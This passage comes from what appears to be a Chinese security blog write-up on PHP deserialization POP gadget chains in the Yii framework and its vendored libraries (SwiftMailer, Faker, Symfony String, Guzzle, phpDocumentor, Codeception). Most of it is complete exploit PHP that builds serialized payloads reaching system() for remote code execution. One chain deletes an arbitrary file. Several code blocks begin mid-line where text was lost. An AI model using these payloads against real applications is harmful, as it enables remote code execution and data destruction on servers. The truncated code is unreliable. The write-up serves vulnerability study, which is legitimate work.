        class RunProcess {
            private $processes;
            public function __construct() {
                $this->processes = [new Generator()];
            }
        }
    }
    namespace {
        use Codeception\Extension\RunProcess;
        echo base64_encode(serialize(new RunProcess()));
    }
    ?>
## POP链-5
###  漏洞分析
继续分析上面查找的 `function __destruct()|__wakeup()`  
跟进
`vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php`，这里
`__destruct()` 方法调用了 `clearAll()` 方法，跟进去发现进一步调用了 `clearKey()` 方法，继续跟进，发现会调用
`unlink()` 方法，并且这里的 `$this->path` 是可控的，那么就可以寻找可以利用的 `__toString()` 魔术方法来进行后续的
RCE 操作
全局搜索一下 `__toString()` 方法：`function __toString\(\)`
这里给出几个触发点
    \GuzzleHttp\Psr7/FnStream::__toString -> call_user_func 可以调用命令执行
    \Symfony/string/LazyString::__toString -> value 可以控制该值从而调用 run 方法进行 RCE
    \Codeception\Util\XmlBuilder::__toString -> \DOMDocument::saveXML 可以触发__call方法
    \phpDocumentor\Reflection\DocBlock\Tags\Version::__toString -> render 可以触发__call方法
    \phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -> render 可以触发__call方法
    \phpDocumentor\Reflection\DocBlock\Tags\Deprecated::__toString -> render 可以触发__call方法
    \phpDocumentor\Reflection\DocBlock\Tags\Generic::__toString -> render 可以触发__call方法
    \phpDocumentor\Reflection\DocBlock\Tags\See::__toString -> render 可以触发__call方法
    \phpDocumentor\Reflection\DocBlock\Tags\Link::__toString -> render 可以触发__call方法
    ......
POC链的利用过程为
###  EXP
这里随便用几个触发点构造 exp，剩下的可以自己构造试试  
exp1
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['render'] = [new IndexAction(), 'run'];
            }
        }
    }
    namespace phpDocumentor\Reflection\DocBlock\Tags {
        use Faker\Generator;
        class Deprecated {
            protected $description;
            public function __construct() {
                $this->description = new Generator();
            }
        }
    }
    namespace {
        use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
        class Swift_KeyCache_DiskKeyCache {
            private $path;
            private $keys;
            public function __construct() {
                $this->keys = array("H3rmesk1t"=>array("is"=>"ctfer"));
                $this->path = new Deprecated();
            }
        }
        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
    }
    ?>
exp2
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['saveXML'] = [new IndexAction(), 'run'];
            }
        }
    }
    namespace Codeception\Util {
        use Faker\Generator;
        class XmlBuilder {
            protected $__dom__;
            public function __construct() {
                $this->__dom__ = new Generator();
            }
        }
    }
    namespace {
        use Codeception\Util\XmlBuilder;
        class Swift_KeyCache_DiskKeyCache {
            private $path;
            private $keys;
            public function __construct() {
                $this->keys = array("H3rmesk1t"=>array("is"=>"ctfer"));
                $this->path = new XmlBuilder();
            }
        }
        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
    }
    ?>
exp3
    _fn___toString = array(new MockTrait(), 'generate');
            }
        }
    }
    namespace {
        use GuzzleHttp\Psr7\FnStream;
        class Swift_KeyCache_DiskKeyCache {
            private $path;
            private $keys;
            public function __construct() {
                $this->keys = array("H3rmesk1t"=>array("is"=>"ctfer"));
                $this->path = new FnStream();
            }
        }
        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
    }
    ?>
## POP链-5
###  漏洞分析
继续分析前面搜索的 `__destruct()` 方法入口，跟进
`vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php`，这里
`__destruct` 方法调用了 `file_exists()` 方法，而 `file_exists` 的参数通用是需要 String
类型，所以这里如果能够满足后面的 `getPath()` 方法可控即可继续用上面的 `__toString()` 的方式来触发 RCE 了
跟进 `getPath()` 方法，很明显这里的 `$this->path` 是可控的，可以构造出任意文件删除和 RCE 的 exp 了
POC链的利用过程为
###  EXP
exp1
    path = '/var/www/html/flag';
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
        }
        echo base64_encode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));
    }
    ?>
exp2
    checkAccess = "system";
                $this->id = "calc.exe";
            }
        }
    }
    namespace Symfony\Component\String {
        use yii\rest\IndexAction;
        class LazyString {
            private $value;
            public function __construct() {
                $this->value = [new IndexAction,"run"];
            }
        }
    }
    namespace {
        use Symfony\Component\String\LazyString;
        class Swift_ByteStream_FileByteStream {
            private $path;
            public function __construct() {
                $this->path = new LazyString();
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
        }
        echo base64_encode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));
    }
    ?>
## POP链-6
###  漏洞分析
紧接着上面的思路，继续跟进另一条链子
`vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php`，这里
`__destruct()` 方法调用了 `stop()` 方法，继续跟进发现 `$this->eventDispatcher`
可控，故可以继续利用上面已知的 `__call()` 方法来进行后续操作达到 RCE
POC链的利用过程为
###  EXP
    checkAccess = "system";
                $this->id = "calc.exe";
            }
        }
    }
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['createTransportChangeEvent'] = [new IndexAction,"run"];
            }
        }
    }
    namespace {
        use Faker\Generator;
        abstract class Swift_Transport_AbstractSmtpTransport {
        }
        class Swift_Transport_SendmailTransport extends Swift_Transport_AbstractSmtpTransport {
            protected $started;
            protected $eventDispatcher;
            public function __construct() {
                $this->started = True;
                $this->eventDispatcher = new Generator();
            }
        }
        echo (base64_encode(serialize(new Swift_Transport_SendmailTransport())));
    }
    ?>
## POP链-7
###  漏洞分析
前面查询的结果中有一个点的 `__wakeup()` 方法是可以利用的，跟一下试试
跟进 `vendor/symfony/string/UnicodeString.php`，这里调用了
`normalizer_is_normalized()` 方法，并且 `$this->string` 是可控的，所以可以尝试找一个
`__toString()` 魔术方法来进行后续 RCE 操作，这里直接利用上一条链子找到的那些 `__toString()`
魔术方法即可，当然也可以用这个 `__wakeup()` 方法来触发之前的 `__call()` 方法的 POP 链
POC链的利用过程为
###  EXP
exp1
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Symfony\Component\String {
        use yii\rest\IndexAction;
        class LazyString {
            private $value;
            public function __construct()
            {
                $this->value = [new IndexAction,"run"];
            }
        }
        class UnicodeString{
            protected $string;
            public function __construct() {
                $this->string = new LazyString();
            }
        }
        echo base64_encode((serialize(new UnicodeString())));
    }
    ?>
exp2
    checkAccess = "system";
                $this->id = "calc.exe";
            }
        }
    }
    namespace Faker {
        use yii\rest\IndexAction;
        class Generator {
            protected $formatters;
            public function __construct() {
                $this->formatters['saveXML'] = [new IndexAction,"run"];
            }
        }
    }
    namespace Codeception\Util {
        use Faker\Generator;
        class XmlBuilder {
            protected $__dom__;
            public function __construct() {
                $this->__dom__ = new Generator();
            }
        }
    }
    namespace Symfony\Component\String {
        use Codeception\Util\XmlBuilder;
        class UnicodeString {
            protected $string;
            public function __construct() {
                $this->string = new XmlBuilder();
            }
        }
        echo base64_encode((serialize(new UnicodeString())));
    }
    ?>
## 后言
文中链子的触发方式在 `__call()` 和 `__toString()`
有很多，这里就没用把构造出来的链子都贴出来；各位师傅们有兴趣的话可以自己尝试构造一下，文中有不对的地方还请各位师傅们指正，欢迎大家一起交流学习吖！
## 参考
[Yii反序列化分析](https://www.anquanke.com/post/id/217929#h2-0)  
[详解PHP反序列化漏洞](https://blog.csdn.net/LYJ20010728/article/details/117112864)